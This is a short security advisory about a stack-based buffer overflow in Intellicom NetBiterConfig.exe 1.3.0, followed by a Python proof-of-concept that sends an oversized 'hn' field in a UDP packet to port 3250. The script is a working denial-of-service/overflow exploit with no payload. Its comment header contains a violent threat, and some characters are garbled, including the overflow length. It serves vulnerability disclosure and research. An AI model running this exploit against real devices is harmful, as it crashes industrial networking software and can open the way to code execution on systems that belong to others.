source: http://www.securityfocus.com/bid/37325/info

Intellicom 'NetBiterConfig.exe' is prone to a remote stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition. 

#!/usr/bin/python

# Intellicom NetBiterConfig.exe 1.3.0 Remote Stack Overwrite.
# Ruben Santamarta - www.reversemode.com
# For research purposes ONLY.
# If you use this code to cause damage I�ll cut you open like a f***ing pig.

import sys
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.connect(("10.10.10.10",3250))
s.send("protocol version = 1.10; "
       +"fb type = EVIL-DEVICE; "
       +"module version = 0.66.6; "
       +"mac = 00-30-11-00-BA-CA; "
       +"ip = 192.168.1.52; "
       +"sn = 255.255.255.0; "
       +"gw = 192.168.1.1; "
       +"dhcp = off; "
       +"pswd = off; "
       +"hn = "+"A"*0�60+"; "
       +"dns1 = 192.168.1.33;")
